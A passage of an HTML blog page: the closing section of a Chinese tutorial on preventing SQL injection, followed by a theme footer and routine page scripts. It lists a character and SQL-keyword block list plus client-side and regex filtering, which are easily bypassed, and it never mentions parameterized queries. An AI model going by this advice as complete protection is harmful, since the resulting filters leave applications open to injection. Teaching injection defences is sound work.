YaHei';font-size:18px;"><br></span></p><h2><a name="t3"></a><a name="t3"></a><span style="font-family:'Microsoft YaHei';font-size:24px;color:#3333ff;">四. 防SQL注入措施及建议</span></h2><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">上面通过数据库原理进行了详细的讲解，这种网站基本很少存在了，几乎为0，更多的网页都有相关的屏蔽的。比如：<br>1.在URL设置不允许非法字符，如单引号、等号、注释--、减号，提示非法参数；</span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">2.在URL设置不允许SQL常见的关键词，如and、select、or、insert等；</span></span></p><p><span style="font-family:'Microsoft YaHei';"><span style="font-size:18px;">3.传递的id=115参数必须为数字才能正常跳转，否则跳转错误，如下图所示：<br><br></span></span></p><div style="text-align:center;"><img src="https://img-blog.csdn.net/20170712235345953" width="400" height="100" alt=""></div><p></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;">4.服务器启用SQL注入拦截功能，提示当前网页的 URL / POST / COOKIES中包</span><span style="font-family:'Microsoft YaHei';font-size:18px;">含了特定的 SQL字符而被防火墙拦截，因为可能通过POST、Cookies进行攻击。各方面都需要做到防御。<br></span><br></p><div style="font-family:'宋体';text-align:center;"><img src="https://img-blog.csdn.net/20170712235538443" width="400" height="300" alt=""></div><p></p><p><br><span style="font-family:'Microsoft YaHei';font-size:18px;">5.可以使用Javascript在客户端进行不安全字符屏蔽，也可以在jsp中调用该函数检查是否包函非法字符，或使用正则表达式过滤传入的参数，防止SQL从URL注入。</span></p><p><br></p><p><span style="font-family:'Microsoft YaHei';font-size:18px;">不忘初心，继续前行。加油，秀璋。绿妖，晚安！</span><br style="font-family:Arial;font-size:14px;"><span style="font-family:'Microsoft YaHei';font-size:18px;">(By:Eastmount 2017-07-13 晚上12点</span><span style="color:rgb(51,51,51);font-family:'Microsoft YaHei';font-size:18px;">  </span><a href="http://blog.csdn.net/eastmount/" style="color:rgb(51,102,153);font-family:'Microsoft YaHei';font-size:18px;">http://blog.csdn.net/eastmount/</a><span style="color:rgb(51,51,51);font-family:'Microsoft YaHei';font-size:18px;"> </span><span style="font-family:'Microsoft YaHei';font-size:18px;">)<br></span><br></p>                                    </div><br>
+<div class="more-toolbox"><br>
+<div class="left-toolbox"><br>
+<ul class="toolbox-list"></p>
+
+          
+        <div class="comment">
+          
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="https://github.com/Tyro-Shan" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://Tyro-Shan.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span>我们增长自己的智慧，是为了给自己开一朵花</span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://Tyro-Shan.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://Tyro-Shan.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
